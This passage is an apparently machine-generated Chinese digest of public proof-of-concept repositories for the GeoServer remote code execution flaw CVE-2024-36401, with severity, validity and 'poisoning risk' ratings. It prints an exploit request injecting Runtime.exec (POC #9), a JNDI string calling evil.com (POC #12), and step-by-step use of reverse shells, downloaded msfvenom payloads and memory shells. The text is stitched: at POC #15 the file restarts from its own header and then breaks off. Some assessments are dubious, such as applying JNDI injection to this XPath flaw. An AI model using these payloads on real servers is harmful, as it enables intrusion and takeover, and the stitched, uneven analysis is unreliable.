**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

